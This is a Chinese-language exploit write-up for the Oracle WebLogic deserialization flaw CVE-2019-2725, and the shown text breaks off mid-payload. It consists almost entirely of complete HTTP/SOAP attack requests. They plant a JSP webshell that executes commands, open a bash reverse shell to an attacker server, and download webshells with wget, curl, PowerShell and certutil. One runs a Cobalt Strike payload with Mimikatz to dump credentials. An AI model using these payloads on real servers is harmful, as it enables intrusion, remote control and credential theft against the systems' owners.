<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-2725）（CNVD-C-2019-48814）</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>Oracle WebLogic Server 10.x</p><p>Oracle WebLogic Server 12.1.3</p><h2>三、复现过程</h2><p>访问<a href="http://www.0-sec.org/_async/AsyncResponseService">http://www.0-sec.org/_async/AsyncResponseService</a></p><p><img height="267px" src="data:image/shtml;base64,PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIgogICAgICAgICJodHRwOi8vd3d3LnczLm9yZy9UUi9odG1sNC9zdHJpY3QuZHRkIj4KPGh0bWw+CiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KICAgICAgICA8dGl0bGU+RXJyb3IgcmVzcG9uc2U8L3RpdGxlPgogICAgPC9oZWFkPgogICAgPGJvZHk+CiAgICAgICAgPGgxPkVycm9yIHJlc3BvbnNlPC9oMT4KICAgICAgICA8cD5FcnJvciBjb2RlOiA0MDQ8L3A+CiAgICAgICAgPHA+TWVzc2FnZTogRmlsZSBub3QgZm91bmQuPC9wPgogICAgICAgIDxwPkVycm9yIGNvZGUgZXhwbGFuYXRpb246IEhUVFBTdGF0dXMuTk9UX0ZPVU5EIC0gTm90aGluZyBtYXRjaGVzIHRoZSBnaXZlbiBVUkkuPC9wPgogICAgPC9ib2R5Pgo8L2h0bWw+Cg==" width="400px" /></p><p>若出现以上情况，则有可能会存在漏洞。</p><h3>Win/Linux 通用写入shell代码（一）</h3><p>POST /_async/AsyncResponseService HTTP/1.1<br />Host: ip:port<br />Content-Length: 1142<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;&lt;java version="1.8.0_131" class="java.beans.xmlDecoder"&gt;&lt;object class="java.io.PrintWriter"&gt;&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;&lt;void method="println"&gt;&lt;string&gt;&lt;![CDATA[<br />&lt;%<br />    if("123".equals(request.getParameter("pwd"))){<br />        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();<br />        int a = -1;<br />        byte[] b = new byte[1024];<br />        out.print("&lt;pre&gt;");<br />        while((a=in.read(b))!=-1){<br />            out.println(new String(b));<br />        }<br />        out.print("&lt;/pre&gt;");<br />    }<br />    %&gt;]]&gt;<br />&lt;/string&gt;&lt;/void&gt;&lt;void method="close"/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</p><p>执行完之后访问</p><p>http://www.0-sec.org/_async/webshell.jsp?pwd=123&amp;cmd=whoami</p><h3>Win/Linux 通用写入shell代码（二）</h3><p>POST /_async/AsyncResponseService HTTP/1.1<br />Host: ip:port<br />Content-Length: 1136<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;&lt;java version="1.8.0_131" class="java.beans.xmlDecoder"&gt;&lt;object class="java.io.PrintWriter"&gt;&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.jsp&lt;/string&gt;&lt;void method="println"&gt;&lt;string&gt;&lt;![CDATA[<br />&lt;%<br />    if("123".equals(request.getParameter("pwd"))){<br />        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();<br />        int a = -1;<br />        byte[] b = new byte[1024];<br />        out.print("&lt;pre&gt;");<br />        while((a=in.read(b))!=-1){<br />            out.println(new String(b));<br />        }<br />        out.print("&lt;/pre&gt;");<br />    }<br />    %&gt;]]&gt;<br />&lt;/string&gt;&lt;/void&gt;&lt;void method="close"/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</p><p>执行完之后访问</p><p>http://www.0-sec.org/bea_wls_internal/webshell.jsp?pwd=123&amp;cmd=whoami</p><p>(注：上述报文中servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/，servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/ 均为默认路径，如果路径修改，可以配合反弹shell进行获取)</p><h3>Linux</h3><ul><li>反弹shell<br />POST /_async/AsyncResponseService HTTP/1.1<br />Host: ip:port<br />Content-Length: 853<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   <br />&lt;soapenv:Header&gt; <br />&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;<br />&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;<br />&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;<br />&lt;void class="java.lang.ProcessBuilder"&gt;<br />&lt;array class="java.lang.String" length="3"&gt;<br />&lt;void index="0"&gt;<br />&lt;string&gt;/bin/bash&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="1"&gt;<br />&lt;string&gt;-c&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="2"&gt;<br />&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/vpsip/vpsport 0&amp;gt;&amp;amp;1&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;/array&gt;<br />&lt;void method="start"/&gt;&lt;/void&gt;<br />&lt;/work:WorkContext&gt;<br />&lt;/soapenv:Header&gt;<br />&lt;soapenv:Body&gt;<br />&lt;asy:onAsyncDelivery/&gt;<br />&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</li><li>写入webshell（需要公网） //这里提供两个代码<br />需要自己在公网上放置一个webshell.txt<br />webshell地址：<a href="http://www.0-sec.org/_async/webshell.jsp">http://www.0-sec.org/_async/webshell.jsp</a><br />POST /_async/AsyncResponseService HTTP/1.1<br />Host: ip:port<br />Content-Length: 789<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   <br />&lt;soapenv:Header&gt; <br />&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;<br />&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;<br />&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;<br />&lt;void class="java.lang.ProcessBuilder"&gt;<br />&lt;array class="java.lang.String" length="3"&gt;<br />&lt;void index="0"&gt;<br />&lt;string&gt;/bin/bash&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="1"&gt;<br />&lt;string&gt;-c&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="2"&gt;<br />&lt;string&gt;wget http://vpsip:vpsport/webshell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;/array&gt;<br />&lt;void method="start"/&gt;&lt;/void&gt;<br />&lt;/work:WorkContext&gt;<br />&lt;/soapenv:Header&gt;<br />&lt;soapenv:Body&gt;<br />&lt;asy:onAsyncDelivery/&gt;<br />&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;<br />POST /_async/AsyncResponseService HTTP/1.1<br />Host: ip:port<br />Content-Length: 789<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   <br />&lt;soapenv:Header&gt; <br />&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;<br />&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;<br />&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;<br />&lt;void class="java.lang.ProcessBuilder"&gt;<br />&lt;array class="java.lang.String" length="3"&gt;<br />&lt;void index="0"&gt;<br />&lt;string&gt;/bin/bash&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="1"&gt;<br />&lt;string&gt;-c&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="2"&gt;<br />&lt;string&gt;curl http://vpsip:vpsport/webshell.txt -o servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;/array&gt;<br />&lt;void method="start"/&gt;&lt;/void&gt;<br />&lt;/work:WorkContext&gt;<br />&lt;/soapenv:Header&gt;<br />&lt;soapenv:Body&gt;<br />&lt;asy:onAsyncDelivery/&gt;<br />&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</li><li>写入webshell（无需公网） //这里提供两个代码<br />POST /_async/AsyncResponseService HTTP/1.1<br />Host: 192.168.50.219:7001<br />Content-Length: 1378<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   <br />&lt;soapenv:Header&gt; <br />&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;<br />&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;<br />&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;<br />&lt;void class="java.lang.ProcessBuilder"&gt;<br />&lt;array class="java.lang.String" length="3"&gt;<br />&lt;void index="0"&gt;<br />&lt;string&gt;/bin/bash&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="1"&gt;<br />&lt;string&gt;-c&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="2"&gt;<br />&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;/array&gt;<br />&lt;void method="start"/&gt;&lt;/void&gt;<br />&lt;/work:WorkContext&gt;<br />&lt;/soapenv:Header&gt;<br />&lt;soapenv:Body&gt;<br />&lt;asy:onAsyncDelivery/&gt;<br />&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;<br />写入的webshell地址为：<a href="http://www/0-sec.org/_async/webshell.jsp?pwd=123&amp;cmd=whoami">http://www/0-sec.org/_async/webshell.jsp?pwd=123&amp;cmd=whoami</a><br />POST /_async/AsyncResponseService HTTP/1.1<br />Host: 192.168.50.219:7001<br />Content-Length: 1376<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   <br />&lt;soapenv:Header&gt; <br />&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;<br />&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;<br />&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;<br />&lt;void class="java.lang.ProcessBuilder"&gt;<br />&lt;array class="java.lang.String" length="3"&gt;<br />&lt;void index="0"&gt;<br />&lt;string&gt;/bin/bash&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="1"&gt;<br />&lt;string&gt;-c&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="2"&gt;<br />&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d &gt; servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.jsp&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;/array&gt;<br />&lt;void method="start"/&gt;&lt;/void&gt;<br />&lt;/work:WorkContext&gt;<br />&lt;/soapenv:Header&gt;<br />&lt;soapenv:Body&gt;<br />&lt;asy:onAsyncDelivery/&gt;<br />&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;<br />写入的webshell地址为：<a href="http://www.0-sec.org/bea_wls_internal/webshell.jsp?pwd=123&amp;cmd=whoami">http://www.0-sec.org/bea_wls_internal/webshell.jsp?pwd=123&amp;cmd=whoami</a><br /><strong>Win</strong></li><li>反弹shell<br />可直接使用CobaltStrike生成一个payload.ps1 powershell脚本，将该脚本放到公网上，然后使用如下报文即可<br />POST /_async/AsyncResponseService HTTP/1.1<br />Host: ip:port<br />Content-Length: 861<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   <br />&lt;soapenv:Header&gt; <br />&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;<br />&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;<br />&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;<br />&lt;void class="java.lang.ProcessBuilder"&gt;<br />&lt;array class="java.lang.String" length="3"&gt;<br />&lt;void index="0"&gt;<br />&lt;string&gt;cmd&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="1"&gt;<br />&lt;string&gt;/c&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="2"&gt;<br />&lt;string&gt;powershell &quot;IEX (New-Object Net.WebClient).DownloadString('http://ip:port/payload.ps1'); Invoke-Mimikatz -DumpCreds&quot;&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;/array&gt;<br />&lt;void method="start"/&gt;&lt;/void&gt;<br />&lt;/work:WorkContext&gt;<br />&lt;/soapenv:Header&gt;<br />&lt;soapenv:Body&gt;<br />&lt;asy:onAsyncDelivery/&gt;<br />&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</li><li>写入webshell（需要公网） //这里提供两个代码<br />需要自己在公网上放置一个webshell.txt<br />webshell地址为：<a href="http://www.0-sec.org/_async/webshell.jsp">http://www.0-sec.org/_async/webshell.jsp</a><br />POST /_async/AsyncResponseService HTTP/1.1<br />Host: ip:port<br />Content-Length: 854<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   <br />&lt;soapenv:Header&gt; <br />&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;<br />&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;<br />&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;<br />&lt;void class="java.lang.ProcessBuilder"&gt;<br />&lt;array class="java.lang.String" length="3"&gt;<br />&lt;void index="0"&gt;<br />&lt;string&gt;cmd&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="1"&gt;<br />&lt;string&gt;/c&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="2"&gt;<br />&lt;string&gt;powershell (new-object System.Net.WebClient).DownloadFile( 'http://ip:port/webshell.txt','servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp')&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;/array&gt;<br />&lt;void method="start"/&gt;&lt;/void&gt;<br />&lt;/work:WorkContext&gt;<br />&lt;/soapenv:Header&gt;<br />&lt;soapenv:Body&gt;<br />&lt;asy:onAsyncDelivery/&gt;<br />&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;<br />POST /_async/AsyncResponseService HTTP/1.1<br />Host: ip:port<br />Content-Length: 854<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   <br />&lt;soapenv:Header&gt; <br />&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;<br />&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;<br />&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;<br />&lt;void class="java.lang.ProcessBuilder"&gt;<br />&lt;array class="java.lang.String" length="3"&gt;<br />&lt;void index="0"&gt;<br />&lt;string&gt;cmd&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="1"&gt;<br />&lt;string&gt;/c&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="2"&gt;<br />&lt;string&gt;certutil -urlcache -split -f http://ip:port/webshell.txt servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;/array&gt;<br />&lt;void method="start"/&gt;&lt;/void&gt;<br />&lt;/work:WorkContext&gt;<br />&lt;/soapenv:Header&gt;<br />&lt;soapenv:Body&gt;<br />&lt;asy:onAsyncDelivery/&gt;<br />&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</li><li>写入webshell （无需公网） //这里提供四个代码</li></ul><h4><em>前两组代码</em></h4><p>POST /_async/AsyncResponseService HTTP/1.1<br />Host: ip:port<br />Content-Length: 1367<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   <br />&lt;soapenv:Header&gt; <br />&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;<br />&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;<br />&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;<br />&lt;void class="java.lang.ProcessBuilder"&gt;<br />&lt;array class="java.lang.String" length="3"&gt;<br />&lt;void index="0"&gt;<br />&lt;string&gt;cmd&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="1"&gt;<br />&lt;string&gt;/c&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="2"&gt;<br />&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4=  &gt; servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\webshell.txt&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;/array&gt;<br />&lt;void method="start"/&gt;&lt;/void&gt;<br />&lt;/work:WorkContext&gt;<br />&lt;/soapenv:Header&gt;<br />&lt;soapenv:Body&gt;<br />&lt;asy:onAsyncDelivery/&gt;<br />&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</p><p>POST /_async/AsyncResponseService HTTP/1.1<br />Host: ip:port<br />Content-Length: 913<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   <br />&lt;soapenv:Header&gt; <br />&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;<br />&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;<br />&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;<br />&lt;void class="java.lang.ProcessBuilder"&gt;<br />&lt;array class="java.lang.String" length="3"&gt;<br />&lt;void index="0"&gt;<br />&lt;string&gt;cmd&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="1"&gt;<br />&lt;string&gt;/c&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="2"&gt;<br />&lt;string&gt;certutil -decode servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\webshell.txt servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\webshell.jsp&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;/array&gt;<br />&lt;void method="start"/&gt;&lt;/void&gt;<br />&lt;/work:WorkContext&gt;<br />&lt;/soapenv:Header&gt;<br />&lt;soapenv:Body&gt;<br />&lt;asy:onAsyncDelivery/&gt;<br />&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</p><p>这两组代码的webshell地址为：<a href="http://www.0-sec.org/_async/webshell.jsp?pwd=123&amp;cmd=whoami">http://www.0-sec.org/_async/webshell.jsp?pwd=123&amp;cmd=whoami</a></p><h4><em>后两组代码</em></h4><p>POST /_async/AsyncResponseService HTTP/1.1<br />Host: ip:port<br />Content-Length: 1367<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   <br />&lt;soapenv:Header&gt; <br />&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;<br />&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;<br />&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;<br />&lt;void class="java.lang.ProcessBuilder"&gt;<br />&lt;array class="java.lang.String" length="3"&gt;<br />&lt;void index="0"&gt;<br />&lt;string&gt;cmd&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="1"&gt;<br />&lt;string&gt;/c&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="2"&gt;<br />&lt;string&gt;echo 